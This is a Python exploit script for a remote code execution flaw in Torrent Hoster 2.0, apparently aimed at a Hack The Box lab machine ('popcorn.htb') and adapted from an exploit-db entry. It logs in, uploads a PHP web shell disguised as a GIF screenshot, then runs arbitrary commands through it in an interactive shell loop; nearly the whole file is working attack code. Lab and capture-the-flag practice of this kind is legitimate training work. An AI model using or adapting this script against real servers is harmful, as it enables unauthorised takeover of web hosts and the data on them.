#!/bin/python3
# Torrent Hoster 2.0 RCE
# Create Account and Upload Any Torrent
# Set Configs
# Author: 1banger
# Original Author: El-Kahina
# https://www.exploit-db.com/exploits/11746

import requests
import re
import sys
import base64

# CONFIG
url_base = 'http://popcorn.htb/torrent/'
username = 'test'
password = '1234'
torrent_id = 'ed6106425c8fd7635cf9160f1e7f7eb5ff1366d5'
proxies = {}
# proxies = {'http': 'http://127.0.0.1:8080'} # Uncomment This To Send Through Burp

print('[+] GET COOKIE')
session = requests.Session()
session.get(url_base, proxies=proxies)

print('[+] LOGGING IN')

login_data = {
    'username': username,
    'password': password
}

login_attempt = session.post(url_base + 'login.php', data=login_data, proxies=proxies)

if re.search(r'\bInvalid login\b', login_attempt.text):
    print('[-] FAILED - PLEASE CREATE ACCOUNT AND TORRENT')
    sys.exit()

def exploit(user_input, url_base, torrent_id, proxies):
    # UPLOAD SCREENSHOT/PHP
    upload_data = '''-----------------------------297205318314337218051203563275
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif

GIF87a;<?php echo base64_encode(shell_exec("''' + user_input + '''"));?>

-----------------------------297205318314337218051203563275
Content-Disposition: form-data; name="submit"

Submit Screenshot
-----------------------------297205318314337218051203563275--'''
    upload_headers = {"Content-Type" : "multipart/form-data; boundary=---------------------------297205318314337218051203563275"}
    session.post(url_base + 'upload_file.php?mode=upload&id=' + torrent_id, headers=upload_headers, data=upload_data, proxies=proxies)

    # NAVIGATE TO PHP UPLOAD AND SANITIZE OUTPUT
    RCE = session.get(url_base + 'upload/' + torrent_id + '.php', proxies=proxies).text
    RCE = RCE.split(';')[1]
    RCE = base64.standard_b64decode(RCE)
    RCE = RCE[:-1]
    RCE = RCE.decode("utf-8")    

    return(RCE)

# CHECK WORKING FIND USER AND PWD
if exploit('whoami', url_base, torrent_id, proxies):
    print('[+] WE HAVE RCE - TYPE \'quit\' TO EXIT')
    whoami = exploit('whoami', url_base, torrent_id, proxies)
    pwd = exploit('pwd', url_base, torrent_id, proxies)
else:
    print('[-] FAILURE')
    sys.exit()

# SHELL LOOP
while True:
    user_input = input(whoami + ':' + pwd + '$ ')
    if user_input == 'quit':
        sys.exit()
    else:
        message_return = exploit(user_input, url_base, torrent_id, proxies)
        print(message_return)